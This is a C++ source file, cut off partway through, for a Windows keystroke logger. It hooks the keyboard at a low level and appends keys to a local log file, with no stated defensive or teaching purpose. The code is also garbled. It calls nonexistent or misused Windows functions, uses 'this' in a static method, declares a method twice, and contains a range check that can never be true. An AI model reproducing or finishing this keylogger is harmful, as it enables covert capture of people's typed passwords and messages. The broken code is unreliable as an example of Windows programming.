#include <windows.h>
#include <iostream>
#include <fstream>
#include <ctime>
#include <thread>
#include <mutex>
#include <iostream>

using namespace std;

class KeystrokeLogger {
private:
    static int hookID;
    static HHOOK hook;
    static HANDLE file;
    static mutex fileMutex;

    KeystrokeLogger() {}
    ~KeystrokeLogger() {
        UnhookKeyboard(hook);
        if (file) {
            CloseHandle(file);
        }
    }

public:
    static void Initialize();
    static void LogKeystroke(unsigned char key, bool isKeyDown, int time);

    static void Initialize() {
        static bool initialized = false;
        if (initialized)
            return;

        hook = SetWindowsHook(WH_KEYBOARD_LL, KeystrokeLogger::LogKeystroke);
        file = CreateFile("keystrokes.log", FILE_APPEND);
        if (file == -1) {
            printf("Failed to create keystroke file\n");
            return;
        }

        // Enable the hook for the current thread
        thread_local_ptr<KeystrokeLogger> ptr(this);
        DWORD oldMode = GetThreadLocalBaseAddress();
        SetThreadContext(ptr.get(), CLSCTX_ALL_ACCESS);
        initialized = true;
    }

    static void LogKeystroke(unsigned char key, bool isKeyDown, int time) {
        if (!isKeyDown)
            return;

        // Ignore non-printable characters
        if (key > ' ' && key < 0x1F) {
            return;
        }

        // Handle special keys with Shift modifier
        if (key == 0x1E || key == 0x1F) {
            if (IsKeyDown(KEYMOD_SHIFT)) {
